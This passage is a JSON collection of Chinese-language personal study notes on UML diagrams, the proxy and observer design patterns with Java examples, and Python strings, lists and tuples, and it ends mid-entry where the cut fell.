[
  {
    "title": "./notes/Untitled.md",
    "body": ""
  },
  {
    "title": "./notes/基础知识/设计模式.md",
    "body": "# UML：\n## 用例图\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/26ueP6jLI8E\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n用例图是描述用例、参与者以及它们之间关系的图。\n用例图是从用户的角度来描述对信息系统的需求，分析产品的功能和行为。\n用例图定义和描述了系统的外部可见行为，是分析、设计直至组装测试的重要依据。\n\n用例图由如下几个概念组成：\n- `参与者actor`：角色，系统的用户；\n- `系统边界system scope`：确定系统的范围，边界是一个方框，用例在边界内，参与者在边界外；\n- `用例use case`：系统提供的服务；\n- `关联association`：参与者与用例间、用例与用例间的关系。\n\n### 参与者\n参与者是指在系统之外，但与系统直接交互的对象，即actor，也叫执行者、活动者。\n\n参与者用人形符号表示，在人形符号下面标出参与者的角色名。参与者不止是人员，也有可能是信息系统、设备。\n\n> 注意：参与者不是指人或事物本身，而是表示人或事物当时扮演的角色\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141105.png)\n\n### 用例\n用例就是外部可见的系统功能，对系统提供的服务进行描述\n\n### 用例描述\n用例图没有描述系统行为的细节，所以需要以书面文档的形式对用例进行描述。至少包括：\n- `名称`：与用例图中的名称保持一致；\n- `标识符`：用例的代码或编号；\n- `基本操作流程`：描述各项工作都正常进行时用例的工作方式；\n- `可选操作流程`：很少使用、异常情况、发出错误的情况。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141132.png)\n\n另外还能包括：用例概述、范围、参与者、前置条件、后置条件、子事件流、规则与约束等。\n\n\n### 用例图中的各种关系\n- 参与者与用例间的关联关系：参与者与用例之间的通信，也成为关联或通信关系。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141146.png)\n\n- 用例与用例之间的关系：包含关系（include）、扩展关系（extend）、泛化关系。\n\n#### 包含关系\n包含关系描述的是一个用例需要某种功能，而该功能被另外一个用例定义，那么在用例的执行过程中，就可以调用已经定义好的用例。表示符号：`<<include>>`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141200.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141209.png)\n\n#### 扩展关系\n扩展关系也是用例之间的关系，指在一个基础用例**可能有的**扩展的用例。比如登陆用例有扩展注册用例。因为如果已经注册过，则直接登陆，如果没有则跳转到注册用例\n\n扩展关系显示为虚线箭头，空心箭头由扩展用例指向到基础用例。箭头有关键字`<<extend>>`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401170952.png)\n\n**包含关系与扩展关系的区别**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141231.png)\n\n- A用例发生是B用例发生的充分必要条件\n- A用例发生是C用例发生的必要不充分条件\n- A用例发生一定会导致B用例发生，但C用例不一定会发生\n- B用例与C用例发生的前提条件是A用例发生\n\n#### 泛化关系\n子用例继承了父用例所有的结构、行为和关系，是父用例的一种特殊形式。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141243.png)\n\n### 案例\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401171106.png)\n\n\n## 活动图\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/VbrN2D0gOeE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n用来描述执行算法的工作流程中涉及的活动，活动状态代表了一个活动：一个工作步骤或一个操作的执行。活动图描述了一组顺序或并发的活动。主要是将用例细化，**即用例内部的细节可以以活动图的方式描述。**\n\n活动图描述活动的顺序，主要表活动之间的控制流，是内部处理驱动的流程，在本质上是一种流程图\n\n### 活动图基本元素\n#### 活动状态图（Activity）\n活动状态用于表达状态机中的非原子的运行，其特点如下：\n1. 活动状态可以分解成其他子活动或者动作状态。\n2. 活动状态的内部活动可以用另一个活动图来表示。\n3. 和动作状态不同，活动状态可以有入口动作和出口动作，也可以有内部转移。\n4. 动作状态是活动状态的一个特例，如果某个活动状态只包括一个动作，那么它就是一个动作状态。\n\nUML中活动状态和动作状态的图标相同，但是活动状态可以在图标中给出入口动作和出口动作等信息。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142658.png)\n\n#### 动作状态（Actions）\n动作状态是指原子的，不可中断的动作，并在此动作完成后通过完成转换转向另一个状态。动作状态有如下特点：\n1. 动作状态是原子的，它是构造活动图的最小单位。\n2. 动作状态是不可中断的。\n3. 动作状态是瞬时的行为。\n4. 动作状态可以有入转换，入转换既可以是动作流，也可以是对象流。动作状态至少有一条出转换，这条转换以内部的完成为起点，与外部事件无关。\n5. 动作状态与状态图中的状态不同，它不能有入口动作和出口动作，更不能有内部转移。\n6. 在一张活动图中，动作状态允许多处出现。\n\nUML中的动作状态图用平滑的圆角矩形表示，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142746.png)\n\n#### 动作状态约束（Action Constraints）\n动作状态约束：用来约束动作状态。如下图展示了动作状态的前置条件和后置条件\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142810.png)\n\n#### 动作流（Control Flow）\n动作之间的转换称之为动作流，活动图的转换用带箭头的直线表示，箭头的方向指向转入的方向。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142835.png)\n\n#### 开始节点（Initial Node）\n开始节点：表示成实心黑色圆点\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142851.png)\n\n#### 终止节点（Final Node）\n分为活动终止节点（activity final nodes）和流程终止节点（flow final nodes）。\n\n活动终止节点表示整个活动的结束\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142908.png)\n\n而流程终止节点表示是子流程的结束。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401142923.png)\n\n#### 对象（Objects）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143013.png)\n\n#### 数据存储对象（DataStore）\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143029.png)\n\n使用关键字`«datastore»`\n\n#### 对象流（Object Flows）\n对象流是动作状态或者活动状态与对象之间的依赖关系，表示动作使用对象或动作对对象的影响。用活动图描述某个对象时，可以把涉及到的对象放置在活动图中并用一个依赖将其连接到进行创建、修改和撤销的动作状态或者活动状态上，对象的这种使用方法就构成了对象流。\n\n对象流中的对象有以下特点：\n1. 一个对象可以由多个动作操作。\n2. 一个动作输出的对象可以作为另一个动作输入的对象。\n3. 在活动图中，同一个对象可以多次出现，它的每一次出现表面该对象正处于对象生存期的不同时间点。\n\n对象流用带有箭头的虚线表示。如果箭头是从动作状态出发指向对象，则表示动作对对象施加了一定的影响。施加的影响包括创建、修改和撤销等。如果箭头从对象指向动作状态，则表示该动作使用对象流所指向的对象。\n\n状态图中的对象用矩形表示，矩形内是该对象的名称，名称下的方括号表明对象此时的状态。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143109.png)\n\n#### 分支与合并（Decision and Merge Nodes）\n分支与合并用菱形表示\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143124.png)\n\n#### 分叉与汇合（Fork and Join Nodes）\n分为水平风向和垂直方向。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143153.png)\n\n对象在运行时可能会存在两个或多个并发运行的控制流，为了对并发的控制流建模，UML中引入了分叉与汇合的概念。分叉用于将动作流分为两个或多个并发运行的分支，而汇合则用于同步这些并发分支，以达到共同完成一项事务的目的。\n\n#### 异常处理（Exception Handler）\n当受保护的活动发生异常时，触发异常处理节点。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143215.png)\n\n#### 活动中断区域（Interruptible Activity Region）\n活动中断区域围绕一些可被中断的动作状态图。比如下图，正常情况下【Process Order】顺序流转到【Close Order】，订单处理流程完毕；但在【Process Order】过称中，会发送【Cancel Order】请求，这时会流转到【Cancel Order】，从而订单处理流程结束\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143239.png)\n\n#### 泳道（Partition）\n泳道将活动图中的活动划分为若干组，并把每一组指定给负责这组活动的业务组织，即对象。在活动图中，泳道区分了负责活动的对象，它明确地表示了哪些活动是由哪些对象进行的。在包含泳道的活动图中，每个活动只能明确地属于一个泳道。\n\n泳道是用垂直实线绘出，垂直线分隔的区域就是泳道。在泳道的上方可以给出泳道的名字或对象的名字，该对象负责泳道内的全部活动。泳道没有顺序，不同泳道中的活动既可以顺序进行也可以并发进行，动作流和对象流允许穿越分隔线。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143301.png)\n\n### 活动图案例分析\n#### 案例1\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143330.png)\n\n1. 泳道分为：会员泳道和系统泳道。会员选择商品并加入购物车，系统完成订单生成及其支付完毕。\n2. 开始节点：会员添加商品到购物车，点击【订单确认】，开始交于系统处理订单流程\n3. 结束节点：商品发送完毕和付款成功，订单处理流程结束\n4. 活动状态：产生订单、Check Credit Cart核对信用卡、Check Stock 核对库存量、Deliver Goods 发送商品、Process Credit Cart付款\n5. 分叉与汇合：【产生订单】份叉为检查库存量和会员支付金额是否足够，如果不足，取消订单，如过库存量和支付金额足够，发送商品和付款，最后汇合为订单完成。\n\n#### 案例2\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401143505.png)\n\n### 总结\n活动图描述的是对象活动的顺序关系所遵循的规则，它着重表现的是系统的行为，而非系统的处理过程。活动图能够表示并发活动的情形，活动图是面向对象的。\n\n\n## 时序图\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/4WM_CAQKjts\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n时序图（Sequence Diagram）是显示对象之间交互的图，这些对象是按时间顺序排列的。顺序图中显示的是参与交互的对象及其对象之间消息交互的顺序。时序图中包括的建模元素主要有：对象（Actor）、生命线（Lifeline）、控制焦点（Focus of control）、消息（Message）等等。\n\n### 时序图元素\n#### 角色（Actor）\n系统角色，可以是人、及其甚至其他的系统或者子系统。\n\n#### 对象（Object）\n 对象包括三种命名方式：\n1. 第一种方式包括对象名和类名；\n2. 第二中方式只显示类名不显示对象名，即表示他是一个匿名对象；\n3. 第三种方式只显示对象名不显示类明。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401153558.png)\n\n#### 生命线（Lifeline）\n生命线在顺序图中表示为从对象图标向下延伸的一条虚线，表示对象存在的时间，如下图\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401153621.png)\n\n#### 控制焦点（Focus of Control）\n控制焦点是顺序图中表示时间段的符号，在这个时间段内对象将执行相应的操作。用小矩形表示，如下图。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401153647.png)\n\n#### 消息（Message）\n消息一般分为同步消息（Synchronous Message），异步消息（Asynchronous Message）和返回消息（Return Message）.如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401153724.png)\n\n- 同步消息=调用消息（Synchronous Message）\n消息的发送者把控制传递给消息的接收者，然后停止活动，等待消息的接收者放弃或者返回控制。用来表示同步的意义。\n\n- 异步消息（Asynchronous Message）\n消息发送者通过消息把信号传递给消息的接收者，然后继续自己的活动，不等待接受者返回消息或者控制。异步消息的接收者和发送者是并发工作的。\n\n- 返回消息（Return Message）\n返回消息表示从过程调用返回\n\n#### 自关联消息（Self-Message）\n表示方法的自身调用以及一个对象内的一个方法调用另外一个方法。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401153840.png)\n\n#### 组合片段(Combined Fragments)\n1. Alternative fragment（denoted “alt”） 与 if…then…else对应\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401154015.png)\n\n2. Option fragment (denoted “opt”) 与 Switch对应\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401154139.png)\n\n3. Parallel fragment (denoted “par”) 表示同时发生\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401154215.png)\n\n4. Loop fragment(denoted “loop”) 与 for 或者 Foreach对应\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401154057.png)\n\n### 时序图实例分析\n#### 案例1\n\n**时序图场景**\n\n完成课程创建功能，主要流程有：\n1. 请求添加课程页面，填写课程表单，点击【create】按钮\n2. 添加课程信息到数据库\n3. 向课程对象追加主题信息\n4. 为课程指派教师\n5. 完成课程创建功能\n\n**时序图实例**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401154339.png)\n\n**时序图实例分析**\n\n1. 序号1.0-1.3  完成页面的初始化\n2. 序号1.4-1.5  课程管理员填充课程表单\n3. 序号1.6-1.7  课程管理员点击【Create】按钮，并响应点击事件\n4. 序号1.8     Service层创建课程\n5. 序号1.9-1.10 添加课程到数据库，并返回课程编号CourseId\n6. 序号1.11-1.12 添加课程主题到数据库，并返回主题编号topicId\n7. 序号1.13         给课程指派教师\n8. 序号1.14         向界面抛创建课程成功与否的消息\n\n#### 案例2\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401154455.png)\n\n### 总结（Summary）\n时序图（Sequence Diagram）是显示对象之间交互的图，这些对象是按时间顺序排列的。顺序图中显示的是参与交互的对象及其对象之间消息交互的顺序。时序图中包括的建模元素主要有：对象（Actor）、生命线（Lifeline）、控制焦点（Focus of control）、消息（Message）等等。最后，以课程创建功能演示一时序图实例。\n\n## 类图\n### 关联关系\n关联关系是类属性的一种表示方式。如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211225161903.png)\n\n上面三种方式都表示Register类多属性含有Sale类\n\n### 依赖关系\n在类图中，使用依赖线描述对象之间的全局变量、参数变量、局部变量和静态方怯(对其他类的静态方法加以调用)的依赖。\n\n例如:\n```java\npublic class Sale {\n  public void updatePriceFor(ProductDescription description){\n    Money basePrice = description.getPrice();\n  }\n}\n```\nupdatePriceFor方法接收ProductDescription对象作为参数，然后向其发送getPrice消息。由此可见， Sale对象对ProductDescription具有参数可见性，并且有发送消息的藕合，因此对ProductDescriptio有依赖。如果后者发生变化， Sale类将会受到影响。这种依赖可以在类图中表示:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211225162355.png)\n\n\n再看一个例子，以下的Java代码显示了Foo类中的doX方法：\n```java\npublic class Foo {\n  public void doX() {\n    System.runFinalization();\n  }\n}\n```\n其中， doX方法调用了System类的静态方怯。因此， Foo对象对System类具有静态方法依赖。这种依赖可以在类图中表示:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211225162612.png)\n\n#### 侬赖标签\n为表示依赖的类型，或者为代码生成工具提供帮助，可以给依赖线附加关键字或构造型。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211225162712.png)\n\n### 关系判断技巧\n类图中泛化、实现关系好判断，主要是关联、组合、依赖不好判断。可以按装下列步骤来判断：\n- 类A包含成员变量类B时，如果A与B实例不能分离，即同生同灭的话，则A与B为组合关系。反之为关联关系。\n- 类A不包含成员变量类B，但调用了类B中的成员属性时，则A与B为依赖关系\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211225165329.png)\n\n## 状态图\n状态图用来描述一个特定对象的所有可能状态以及由于各种事件的发生而引起的状态之间的转移\n\n状态图的图符\n- 状态：矩形，四角为圆弧\n- 转移：箭头\n- 起点：一个黑点\n- 终点：一个圈加一个黑点\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141255.png)\n\n# 代理模式\n代理模式的分类：\n- 静态代理\n- 动态代理\n\n## 静态代理\n代理模式角色示意图\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141313.png)\n- 抽象角色：一般会使用接口或者抽象类来完成， 如上面的租房\n- 真实角色：被代理的角色，如房东\n- 代理角色：代理真实角色，如中介，即代理房东做一些事情\n- 客户：访问代理角色的人，如租房的人\n\n代码实现\n**抽象角色**\n```java\npublic interface Rent{\n  public void rent();\n}\n```\n**真实角色**\n```java\npublic class Host implements Rent{\n  public void rent(){\n    System.out.println(\"房东要出租房子了\");\n  }\n}\n```\n**代理角色**\n```java\npublic class Proxy implements Rent{\n  private Host host;\n\n  public Proxy(){\n  }\n  public Proxy(Host host){\n    this.host = host;\n  }\n\n  public void rent(){\n    seeHouse();\n    host.rent();\n    fare();\n  }\n\n  public void seeHouse(){\n    System.out.println(\"中介带你看房\");\n  }\n  public void fare(){\n    System.out.println(\"收中介费\");\n  }\n}\n```\n**客户**\n```java\npublic class Client{\n  public static void main(String[] args){\n    Host host = new Host();\n    Proxy proxy = new Proxy(host);\n    proxy.rent();\n  }\n}\n```\n\n## 动态代理\n静态代理的缺点：\n- 假如一个系统中由100个真实角色，则需要创建100个代理对象\n- 如果一个真实角色中有很多方法需要增强，那么会发现代理对象的方法中有很多重复的代码\n基于上述问题，就可以很好地用动态代理解决\n\n动态代理的角色示意图与静态代理的一样，区别只在于动态代理的代理对象是动态生成的，而不是直接写好的\n动态代理分为两大类：\n- 基于接口的动态代理，常用JDK动态代理\n- 基于类的动态代理，常用cglib动态代理\n\n# 观察者模式\n观察者模式角色示意图\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141326.png)\n现在需求时，网易与腾讯都在观察着气象站发生的变化，气象站一发生变化就会通知到网易与腾讯\n\n**气象站**\n```java\nclass WeatherStation{\n  private List<WeatherObserver> observers = new ArrayList<WeatherObserver>();\n  private int weatherState;\n\n  public int getWeatherState(){return weatherState;}\n\n  public void setWeatherState(int weatherState){\n    this.weatherState = weatherState;\n    notifyAllWeatherObservers();\n  }\n\n  public void addWeatherObserver(WeatherObserver ob){\n    observers.add(ob);\n  }\n\n  public void notifyAllWeatherObservers(){\n    for(WeatherObserver observer : observers){\n      observer.update();\n    }\n  }\n}\n```\n**抽象观察者**\n```java\nabstract class WeatherObserver{\n  public WeatherStation weatherStation;\n  public abstract void update();\n}\n```\n**具体观察者(网易、腾讯)**\n```java\nclass Wangyi extends WeatherObserver{\n  public Wangyi(WeatherStation weatherStation){\n    this.weatherStation = weatherStation;\n    this.weatherStation.addWeatherObserver(this);\n  }\n  public void update(){\n    System.out.println(\"网易观察到气象站发来的气象变化通知:\" + weatherStation.getWeatherState());\n  }\n}\n\nclass Tencent extends WeatherObserver{\n  public Tencent(WeatherStation weatherStation){\n    this.weatherStation = weatherStation;\n    this.weatherStation.addWeatherObserver(this);\n  }\n  public void update(){\n    System.out.println(\"腾讯观察到气象站发来的气象变化通知:\" + weatherStation.getWeatherState());\n  }\n}\n```\n**Client**\n```java\npublic class Math{\n  public static void main(String[] args){\n    WeatherStation weatherStation = new WeatherStation();\n\n    new Wangyi(weatherStation);\n    new Tencent(weatherStation);\n\n    System.out.println(\"First state change: 天气是15°\");   \n    weatherStation.setWeatherState(15);\n    System.out.println(\"Second state change: 天气是20°\");  \n    weatherStation.setWeatherState(20);\n  }\n}\n```\n输出：\n```\nFirst state change: 天气是15°\n网易观察到气象站发来的气象变化通知:15\n腾讯观察到气象站发来的气象变化通知:15\nSecond state change: 天气是20°\n网易观察到气象站发来的气象变化通知:20\n腾讯观察到气象站发来的气象变化通知:20\n```\n\n## 发布订阅模式\n观察者模式和发布订阅模式最大的区别就是发布订阅模式有个事件调度中心。\n在观察者模式中，观察者与目标(气象站)是直接进行交互的。\n在发布订阅模式中，订阅者(观察者)和发布者(气象站)是互不干扰的，是由调度中心来处理的\n\n发布订阅模式角色示意图\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220401141338.png)\n\n# 正确理解一对多的关系\nA与B的关系为`1:n`, 则表示A中的一个实体与B中的多个实体对应，**而B中的一个实体只跟A中的一个实体对应。**\n\n例如班级与学生就是`1:n`的关系，1个班级对应多个学生；1个学生对应1个班级\n"
  },
  {
    "title": "./notes/基础知识/python.md",
    "body": "# python中字符串下标\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211223195218.png)\n\n# Python3 中有六个标准的数据类型\n- Number（数字）\n- String（字符串）\n- List（列表）\n- Tuple（元组）\n- Set（集合）\n- Dictionary（字典）\n\nPython3 的六个标准数据类型中：\n- 不可变数据（3 个）：Number（数字）、String（字符串）、Tuple（元组）；\n- 可变数据（3 个）：List（列表）、Dictionary（字典）、Set（集合）。\n\n**注：在 Python 中，变量就是变量，它没有类型，我们所说的\"类型\"是变量所指的内存中对象的类型。**\n\n## Number（数字）\nPython3 支持 int、float、bool、complex（复数）。\n**在Python 3里，只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。**\n像大多数语言一样，数值类型的赋值和计算都是很直观的。\n\n## String（字符串）\nPython中的字符串用单引号 ' 或双引号 \" 括起来，同时使用反斜杠 \\ 转义特殊字符。\n字符串的截取的语法格式如下：\n```\n变量[头下标:尾下标]\n```\n索引值以 0 为开始值，-1 为从末尾的开始位置。\n\n`加号 + `是字符串的连接符， `星号 * `表示复制当前字符串，与之结合的数字为复制的次数。实例如下：\n```py\n#!/usr/bin/python3\n\nstr = 'Runoob'\n\nprint (str)          # 输出字符串\nprint (str[0:-1])    # 输出第一个到倒数第二个的所有字符\nprint (str[0])       # 输出字符串第一个字符\nprint (str[2:5])     # 输出从第三个开始到第五个的字符\nprint (str[2:])      # 输出从第三个开始的后的所有字符\nprint (str * 2)      # 输出字符串两次，也可以写成 print (2 * str)\nprint (str + \"TEST\") # 连接字符串\n```\n执行以上程序会输出如下结果：\n```\nRunoob\nRunoo\nR\nnoo\nnoob\nRunoobRunoob\nRunoobTEST\n```\n\nPython 使用反斜杠 \\ 转义特殊字符，如果你不想让反斜杠发生转义，可以在字符串前面添加一个 r，表示原始字符串：\n```\n>>> print('Ru\\noob')\nRu\noob\n>>> print(r'Ru\\noob')\nRu\\noob\n>>>\n```\n与 C 字符串不同的是，Python 字符串不能被改变。向一个索引位置赋值，比如`word[0] = 'm'`会导致错误。\n注意：\n1. 反斜杠可以用来转义，使用r可以让反斜杠不发生转义。\n2. 字符串可以用+运算符连接在一起，用`*`运算符重复。\n3. Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。\n4. Python中的字符串不能改变。\n\n## List（列表）\nList（列表） 是 Python 中使用最频繁的数据类型。\n列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。\n列表是写在方括号 [] 之间、用逗号分隔开的元素列表。\n和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。\n列表截取的语法格式如下：\n```\n变量[头下标:尾下标]\n```\n加号 + 是列表连接运算符，星号 * 是重复操作。如下实例：\n```py\n#!/usr/bin/python3\n\nlist = [ 'abcd', 786 , 2.23, 'runoob', 70.2 ]\ntinylist = [123, 'runoob']\n\nprint (list)            # 输出完整列表\nprint (list[0])         # 输出列表第一个元素\nprint (list[1:3])       # 从第二个开始输出到第三个元素\nprint (list[2:])        # 输出从第三个元素开始的所有元素\nprint (tinylist * 2)    # 输出两次列表\nprint (list + tinylist) # 连接列表\n```\n以上实例输出结果：\n```\n['abcd', 786, 2.23, 'runoob', 70.2]\nabcd\n[786, 2.23]\n[2.23, 'runoob', 70.2]\n[123, 'runoob', 123, 'runoob']\n['abcd', 786, 2.23, 'runoob', 70.2, 123, 'runoob']\n```\n\n与Python字符串不一样的是，列表中的元素是可以改变的：\n```py\n>>> a = [1, 2, 3, 4, 5, 6]\n>>> a[0] = 9\n>>> a[2:5] = [13, 14, 15]\n>>> a\n[9, 2, 13, 14, 15, 6]\n>>> a[2:5] = []   # 将对应的元素值设置为 []\n>>> a\n[9, 2, 6]\n```\nList 内置了有很多方法，例如 append()、pop() 等等，这在后面会讲到。\n注意：\n1. List写在方括号之间，元素用逗号隔开。\n2. 和字符串一样，list可以被索引和切片。\n3. List可以使用+操作符进行拼接。\n4. List中的元素是可以改变的。\n\nPython 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：\n\n如果第三个参数为负数表示逆向读取，以下实例用于翻转字符串：\n```py\ndef reverseWords(input):\n     \n    # 通过空格将字符串分隔符，把各个单词分隔为列表\n    inputWords = input.split(\" \")\n \n    # 翻转字符串\n    # 假设列表 list = [1,2,3,4],  \n    # list[0]=1, list[1]=2 ，而 -1 表示最后一个元素 list[-1]=4 ( 与 list[3]=4 一样)\n    # inputWords[-1::-1] 有三个参数\n    # 第一个参数 -1 表示最后一个元素\n    # 第二个参数为空，表示移动到列表末尾\n    # 第三个参数为步长，-1 表示逆向\n    inputWords=inputWords[-1::-1]\n \n    # 重新组合字符串\n    output = ' '.join(inputWords)\n     \n    return output\n \nif __name__ == \"__main__\":\n    input = 'I like runoob'\n    rw = reverseWords(input)\n    print(rw)\n```\n输出结果为：\n```\nrunoob like I\n```\n###  list列表添加元素的3种方法\n#### append()方法添加元素\nappend() 方法用于在列表的末尾追加元素，该方法的语法格式如下：\n```py\nlistname.append(obj)\n```\n其中，listname 表示要添加元素的列表；obj 表示到添加到列表末尾的数据，它可以是单个元素，也可以是列表、元组等。\n\n请看下面的演示：\n```py\nl = ['Python', 'C++', 'Java']\n#追加元素\nl.append('PHP')\nprint(l)\n#追加元组，整个元组被当成一个元素\nt = ('JavaScript', 'C#', 'Go')\nl.append(t)\nprint(l)\n#追加列表，整个列表也被当成一个元素\nl.append(['Ruby', 'SQL'])\nprint(l)\n```\n运行结果为：\n```\n['Python', 'C++', 'Java', 'PHP']\n['Python', 'C++', 'Java', 'PHP', ('JavaScript', 'C#', 'Go')]\n['Python', 'C++', 'Java', 'PHP', ('JavaScript', 'C#', 'Go'), ['Ruby', 'SQL']]\n```\n\n可以看到，当给 append() 方法传递列表或者元组时，此方法会将它们视为一个整体，作为一个元素添加到列表中，从而形成包含列表和元组的新列表。\n\n#### extend()方法添加元素\nextend() 和 append() 的不同之处在于：extend() 不会把列表或者元祖视为一个整体，而是把它们包含的元素逐个添加到列表中。\n\nextend() 方法的语法格式如下：\n```py\nlistname.extend(obj)\n```\n其中，listname 指的是要添加元素的列表；obj 表示到添加到列表末尾的数据，它可以是单个元素，也可以是列表、元组等，但不能是单个的数字。\n\n请看下面的演示：\n```py\nl = ['Python', 'C++', 'Java']\n#追加元素\nl.extend('C')\nprint(l)\n#追加元组，元祖被拆分成多个元素\nt = ('JavaScript', 'C#', 'Go')\nl.extend(t)\nprint(l)\n#追加列表，列表也被拆分成多个元素\nl.extend(['Ruby', 'SQL'])\nprint(l)\n```\n运行结果：\n```\n['Python', 'C++', 'Java', 'C']\n['Python', 'C++', 'Java', 'C', 'JavaScript', 'C#', 'Go']\n['Python', 'C++', 'Java', 'C', 'JavaScript', 'C#', 'Go', 'Ruby', 'SQL']\n```\n#### insert()方法插入元素\nappend() 和 extend() 方法只能在列表末尾插入元素，如果希望在列表中间某个位置插入元素，那么可以使用 insert() 方法。\n\ninsert() 的语法格式如下：\n```py\nlistname.insert(index , obj)\n```\n其中，index 表示指定位置的索引值。insert() 会将 obj 插入到 listname 列表第 index 个元素的位置。\n\n当插入列表或者元祖时，insert() 也会将它们视为一个整体，作为一个元素插入到列表中，这一点和 append() 是一样的。\n\n请看下面的演示代码：\n```py\nl = ['Python', 'C++', 'Java']\n#插入元素\nl.insert(1, 'C')\nprint(l)\n#插入元组，整个元祖被当成一个元素\nt = ('C#', 'Go')\nl.insert(2, t)\nprint(l)\n#插入列表，整个列表被当成一个元素\nl.insert(3, ['Ruby', 'SQL'])\nprint(l)\n#插入字符串，整个字符串被当成一个元素\nl.insert(0, \"http://c.biancheng.net\")\nprint(l)\n```\n输出结果为：\n```\n['Python', 'C', 'C++', 'Java']\n['Python', 'C', ('C#', 'Go'), 'C++', 'Java']\n['Python', 'C', ('C#', 'Go'), ['Ruby', 'SQL'], 'C++', 'Java']\n['http://c.biancheng.net', 'Python', 'C', ('C#', 'Go'), ['Ruby', 'SQL'], 'C++', 'Java']\n```\n提示，insert() 主要用来在列表的中间位置插入元素，如果你仅仅希望在列表的末尾追加元素，那我更建议使用 append() 和 extend()。\n\n## Tuple（元组）\n元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。\n元组中的元素类型也可以不相同：\n```py\ntuple = ( 'abcd', 786 , 2.23, 'runoob', 70.2  )\ntinytuple = (123, 'runoob')\n\nprint (tuple)             # 输出完整元组\nprint (tuple[0])          # 输出元组的第一个元素\nprint (tuple[1:3])        # 输出从第二个元素开始到第三个元素\nprint (tuple[2:])         # 输出从第三个元素开始的所有元素\nprint (tinytuple * 2)     # 输出两次元组\nprint (tuple + tinytuple) # 连接元组\n```\n以上实例输出结果：\n```\n('abcd', 786, 2.23, 'runoob', 70.2)\nabcd\n(786, 2.23)\n(2.23, 'runoob', 70.2)\n(123, 'runoob', 123, 'runoob')\n('abcd', 786, 2.23, 'runoob', 70.2, 123, 'runoob')\n```\n元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取（看上面，这里不再赘述）。\n其实，可以把字符串看作一种特殊的元组。\n```py\n>>> tup = (1, 2, 3, 4, 5, 6)\n>>> print(tup[0])\n1\n>>> print(tup[1:5])\n(2, 3, 4, 5)\n>>> tup[0] = 11  # 修改元组元素的操作是非法的\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: 'tuple' object does not support item assignment\n>>>\n```\n虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。\n\n构造包含 0 个或 1 个元素的元组比较特殊，所以有一些额外的语法规则：\n```py\ntup1 = ()    # 空元组\ntup2 = (20,) # 